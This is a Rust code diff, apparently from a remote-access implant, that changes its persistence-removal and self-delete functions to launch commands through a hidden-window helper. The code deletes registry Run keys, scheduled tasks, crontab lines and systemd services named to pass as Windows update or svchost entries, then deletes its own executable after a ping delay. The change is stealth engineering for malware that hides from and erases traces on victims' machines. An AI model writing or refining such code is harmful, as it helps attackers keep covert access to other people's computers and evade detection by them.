@@ -27,7 +27,7 @@ fn remove_persistence() -> String {
         // Remove from all known registry Run keys
         let names_to_try = ["WindowsUpdateService", "WindowsUpdate", "svchost"];
         for name in &names_to_try {
-            let _ = std::process::Command::new("reg")
+            let _ = crate::utils::helpers::hidden_command("reg")
                 .args([
                     "delete",
                     "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -36,7 +36,7 @@ fn remove_persistence() -> String {
                     "/f",
                 ])
                 .output();
-            let _ = std::process::Command::new("reg")
+            let _ = crate::utils::helpers::hidden_command("reg")
                 .args([
                     "delete",
                     "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -47,7 +47,7 @@ fn remove_persistence() -> String {
                 .output();
 
             // Remove scheduled tasks
-            let _ = std::process::Command::new("schtasks")
+            let _ = crate::utils::helpers::hidden_command("schtasks")
                 .args(["/delete", "/tn", name, "/f"])
                 .output();
         }
@@ -77,14 +77,14 @@ fn remove_persistence() -> String {
             .unwrap_or_default();
 
         if !exe_name.is_empty() {
-            let existing = std::process::Command::new("crontab")
+            let existing = crate::utils::helpers::hidden_command("crontab")
                 .args(["-l"])
                 .output()
                 .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                 .unwrap_or_default();
 
             let filtered: Vec<&str> = existing.lines().filter(|l| !l.contains(&exe_name)).collect();
-            let _ = std::process::Command::new("sh")
+            let _ = crate::utils::helpers::hidden_command("sh")
                 .args(["-c", &format!("echo '{}' | crontab -", filtered.join("\n"))])
                 .output();
         }
@@ -98,10 +98,10 @@ fn remove_persistence() -> String {
                 let name = entry.file_name().to_string_lossy().to_string();
                 if name.contains("WindowsUpdate") || name.contains("update-service") {
                     let svc_name = name.trim_end_matches(".service");
-                    let _ = std::process::Command::new("systemctl")
+                    let _ = crate::utils::helpers::hidden_command("systemctl")
                         .args(["--user", "stop", svc_name])
                         .output();
-                    let _ = std::process::Command::new("systemctl")
+                    let _ = crate::utils::helpers::hidden_command("systemctl")
                         .args(["--user", "disable", svc_name])
                         .output();
                     let _ = std::fs::remove_file(entry.path());
@@ -166,7 +166,7 @@ fn schedule_self_delete() -> String {
             "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del /f /q \"{}\"",
             exe_path
         );
-        let _ = std::process::Command::new("cmd.exe")
+        let _ = crate::utils::helpers::hidden_command("cmd.exe")
             .args(["/c", "start", "/b", "", "cmd.exe", "/c", &delete_cmd])
             .spawn();
         format!("self-delete scheduled for: {}", exe_path)
